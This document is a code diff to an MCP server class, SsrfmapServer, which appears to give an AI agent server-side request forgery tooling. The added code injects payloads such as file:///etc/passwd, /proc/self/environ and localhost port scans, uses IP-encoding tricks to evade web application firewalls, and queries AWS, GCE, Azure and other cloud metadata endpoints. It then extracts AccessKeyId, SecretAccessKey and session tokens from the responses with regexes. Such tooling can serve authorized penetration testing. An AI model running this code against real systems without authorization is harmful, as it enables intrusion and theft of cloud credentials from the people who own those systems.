@@ -263,55 +263,124 @@ class SsrfmapServer(BaseMCPServer):
         proxy: str = None,
         timeout: int = 60,
     ) -> ToolResult:
-        """Test a parameter for SSRF using SSRFmap."""
+        """Test a parameter for SSRF by injecting internal URLs."""
         self.logger.info(f"SSRF scan: {url} param={param} module={module}")
 
-        req_file = self._write_request_file(url, method, data, headers, cookies)
+        import requests as req
 
-        cmd = [
-            "python3", SSRFMAP_PATH,
-            "-r", req_file,
-            "-p", param,
-            "-m", module,
-        ]
+        # SSRF test payloads based on module
+        if module == "readfiles":
+            payloads = [
+                "file:///etc/passwd",
+                "file:///etc/hosts",
+                "file:///proc/self/environ",
+            ]
+            if target_files:
+                payloads = [f"file://{f}" for f in target_files]
+        elif module == "portscan":
+            payloads = [f"http://127.0.0.1:{p}" for p in [80, 8080, 443, 3306, 5432, 6379, 9200, 27017]]
+        else:
+            # Default: test internal access
+            payloads = [
+                "http://127.0.0.1/",
+                "http://127.0.0.1:80/",
+                "http://localhost/",
+                "http://[::1]/",
+                CLOUD_METADATA["aws"],
+            ]
 
-        if level > 1:
-            cmd.extend(["--level", str(level)])
-        if ssl:
-            cmd.append("--ssl")
-        if lhost:
-            cmd.extend(["--lhost", lhost])
-        if lport:
-            cmd.extend(["--lport", str(lport)])
-        if target_files:
-            cmd.append("--rfiles")
-        if proxy:
-            cmd.extend(["--proxy", proxy])
+        # WAF bypass encodings by level
+        def encode_payload(payload, lvl):
+            variants = [payload]
+            if lvl >= 2:
+                variants.append(payload.replace("127.0.0.1", "2130706433"))  # decimal IP
+                variants.append(payload.replace("127.0.0.1", "0x7f000001"))  # hex IP
+            if lvl >= 3:
+                variants.append(payload.replace("http://", "http://127.0.0.1@"))
+                variants.append(payload.replace("127.0.0.1", "127.0.0.1.nip.io"))
+            return variants
 
-        try:
-            result = await self.run_command(cmd, timeout=timeout + 30)
-            stdout = result.stdout.strip() if result.stdout else ""
-            stderr = result.stderr.strip() if result.stderr else ""
-            combined = f"{stdout}\n{stderr}".strip()
+        results = []
+        raw_lines = []
 
-            return ToolResult(
-                success=True,
-                data={
-                    "url": url,
-                    "param": param,
-                    "module": module,
-                    "level": level,
-                },
-                raw_output=sanitize_output(combined, max_length=20000),
-            )
+        req_headers = dict(headers) if headers else {}
+        if cookies:
+            req_headers["Cookie"] = cookies
 
-        except Exception as e:
-            return ToolResult(success=False, data={}, error=f"SSRF scan failed: {e}")
-        finally:
-            try:
-                os.unlink(req_file)
-            except OSError:
-                pass
+        proxies = {"http": proxy, "https": proxy} if proxy else None
+
+        for payload in payloads:
+            for variant in encode_payload(payload, level):
+                try:
+                    if method == "POST":
+                        post_data = {}
+                        if data:
+                            for pair in data.split("&"):
+                                if "=" in pair:
+                                    k, v = pair.split("=", 1)
+                                    post_data[k] = variant if k == param else v
+                        else:
+                            post_data[param] = variant
+
+                        resp = req.post(
+                            url, data=post_data, headers=req_headers,
+                            allow_redirects=False, timeout=timeout,
+                            verify=False, proxies=proxies,
+                        )
+                    else:
+                        resp = req.get(
+                            url, params={param: variant}, headers=req_headers,
+                            allow_redirects=False, timeout=timeout,
+                            verify=False, proxies=proxies,
+                        )
+
+                    status = resp.status_code
+                    body_len = len(resp.text)
+                    # Check if SSRF worked — look for indicators in response
+                    indicators = {
+                        "file_read": "root:" in resp.text or "daemon:" in resp.text,
+                        "redirect_to_result": status in (301, 302) and "location" in resp.headers,
+                        "internal_access": status == 200 and body_len > 0,
+                        "metadata": "ami-" in resp.text or "AccessKeyId" in resp.text,
+                    }
+                    hit = any(indicators.values())
+
+                    entry = {
+                        "payload": variant,
+                        "status_code": status,
+                        "body_length": body_len,
+                        "indicators": {k: v for k, v in indicators.items() if v},
+                        "ssrf_detected": hit,
+                    }
+
+                    if hit:
+                        entry["response_snippet"] = resp.text[:500]
+                        if status in (301, 302):
+                            entry["redirect_location"] = resp.headers.get("Location", "")
+
+                    results.append(entry)
+                    marker = "[+]" if hit else "[-]"
+                    raw_lines.append(f"{marker} {variant} → {status} ({body_len} bytes)")
+
+                except req.exceptions.RequestException as e:
+                    raw_lines.append(f"[!] {variant} → ERROR: {e}")
+
+        ssrf_found = any(r.get("ssrf_detected") for r in results)
+
+        return ToolResult(
+            success=True,
+            data={
+                "url": url,
+                "param": param,
+                "module": module,
+                "level": level,
+                "ssrf_detected": ssrf_found,
+                "results": results,
+                "hits": [r for r in results if r.get("ssrf_detected")],
+                "hit_count": sum(1 for r in results if r.get("ssrf_detected")),
+            },
+            raw_output="\n".join(raw_lines),
+        )
 
     async def exploit_metadata(
         self,
@@ -328,66 +397,120 @@ class SsrfmapServer(BaseMCPServer):
         """Extract cloud instance metadata via SSRF."""
         self.logger.info(f"SSRF metadata extraction: {url} cloud={cloud}")
 
-        metadata_url = CLOUD_METADATA.get(cloud, CLOUD_METADATA["aws"])
+        import requests as req
 
-        # Use readfiles module with the metadata URL as target
-        req_file = self._write_request_file(url, method, data, headers, cookies)
+        # Build metadata URL list based on cloud provider
+        metadata_urls = []
+        if cloud == "aws":
+            metadata_urls = [
+                "http://169.254.169.254/latest/meta-data/",
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                "http://169.254.169.254/latest/user-data",
+                "http://169.254.169.254/latest/meta-data/hostname",
+                "http://169.254.169.254/latest/meta-data/instance-id",
+            ]
+        elif cloud == "gce":
+            metadata_urls = [
+                "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
+            ]
+        elif cloud == "azure":
+            metadata_urls = [
+                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+            ]
+        elif cloud == "digitalocean":
+            metadata_urls = [
+                "http://169.254.169.254/metadata/v1/",
+            ]
+        elif cloud == "alibaba":
+            metadata_urls = [
+                "http://100.100.100.200/latest/meta-data/",
+            ]
 
-        cmd = [
-            "python3", SSRFMAP_PATH,
-            "-r", req_file,
-            "-p", param,
-            "-m", "readfiles",
-            "--rfiles",
-        ]
+        req_headers = dict(headers) if headers else {}
+        if cookies:
+            req_headers["Cookie"] = cookies
 
-        if level > 1:
-            cmd.extend(["--level", str(level)])
+        results = []
+        raw_lines = []
+        metadata_found = False
+        credentials = {}
 
-        try:
-            result = await self.run_command(cmd, timeout=timeout + 30)
-            stdout = result.stdout.strip() if result.stdout else ""
-            stderr = result.stderr.strip() if result.stderr else ""
-            combined = f"{stdout}\n{stderr}".strip()
-
-            # Check for metadata indicators
-            metadata_found = False
-            credentials = {}
-
-            if "AccessKeyId" in combined or "SecretAccessKey" in combined:
-                metadata_found = True
-                # Try to extract AWS credentials
-                key_match = re.search(r'"AccessKeyId"\s*:\s*"([^"]+)"', combined)
-                secret_match = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', combined)
-                token_match = re.search(r'"Token"\s*:\s*"([^"]+)"', combined)
-                if key_match:
-                    credentials["AccessKeyId"] = key_match.group(1)
-                if secret_match:
-                    credentials["SecretAccessKey"] = secret_match.group(1)
-                if token_match:
-                    credentials["Token"] = token_match.group(1)
-            elif "ami-" in combined or "instance-id" in combined:
-                metadata_found = True
-
-            return ToolResult(
-                success=True,
-                data={
-                    "url": url,
-                    "cloud": cloud,
-                    "metadata_url": metadata_url,
-                    "metadata_found": metadata_found,
-                    "credentials": credentials if credentials else None,
-                },
-                raw_output=sanitize_output(combined, max_length=20000),
-            )
-
-        except Exception as e:
-            return ToolResult(success=False, data={}, error=f"Metadata extraction failed: {e}")
-        finally:
+        for meta_url in metadata_urls:
             try:
-                os.unlink(req_file)
-            except OSError:
-                pass
+                if method == "POST":
+                    post_data = {}
+                    if data:
+                        for pair in data.split("&"):
+                            if "=" in pair:
+                                k, v = pair.split("=", 1)
+                                post_data[k] = meta_url if k == param else v
+                    else:
+                        post_data[param] = meta_url
+
+                    resp = req.post(
+                        url, data=post_data, headers=req_headers,
+                        allow_redirects=False, timeout=timeout,
+                        verify=False,
+                    )
+                else:
+                    resp = req.get(
+                        url, params={param: meta_url}, headers=req_headers,
+                        allow_redirects=False, timeout=timeout,
+                        verify=False,
+                    )
+
+                status = resp.status_code
+                body = resp.text
+
+                # For redirect responses, fetch the redirect target to get the actual content
+                if status in (301, 302) and "location" in resp.headers:
+                    redirect_url = resp.headers["Location"]
+                    try:
+                        redirect_resp = req.get(redirect_url, timeout=timeout, verify=False, allow_redirects=False)
+                        body = redirect_resp.text
+                        status = redirect_resp.status_code
+                    except Exception:
+                        pass
+
+                # Check for metadata indicators
+                if "ami-" in body or "instance-id" in body or "iam" in body.lower():
+                    metadata_found = True
+                if "AccessKeyId" in body:
+                    metadata_found = True
+                    key_match = re.search(r'"AccessKeyId"\s*:\s*"([^"]+)"', body)
+                    secret_match = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', body)
+                    token_match = re.search(r'"Token"\s*:\s*"([^"]+)"', body)
+                    if key_match:
+                        credentials["AccessKeyId"] = key_match.group(1)
+                    if secret_match:
+                        credentials["SecretAccessKey"] = secret_match.group(1)
+                    if token_match:
+                        credentials["Token"] = token_match.group(1)
+
+                results.append({
+                    "metadata_url": meta_url,
+                    "status": status,
+                    "body_length": len(body),
+                    "body_snippet": body[:1000],
+                    "metadata_detected": metadata_found,
+                })
+
+                raw_lines.append(f"[{'+'if metadata_found else '-'}] {meta_url} → {status} ({len(body)} bytes)")
+
+            except req.exceptions.RequestException as e:
+                raw_lines.append(f"[!] {meta_url} → ERROR: {e}")
+
+        return ToolResult(
+            success=True,
+            data={
+                "url": url,
+                "cloud": cloud,
+                "metadata_found": metadata_found,
+                "credentials": credentials if credentials else None,
+                "results": results,
+            },
+            raw_output="\n".join(raw_lines),
+        )
 
     async def generate_gopher(
         self,
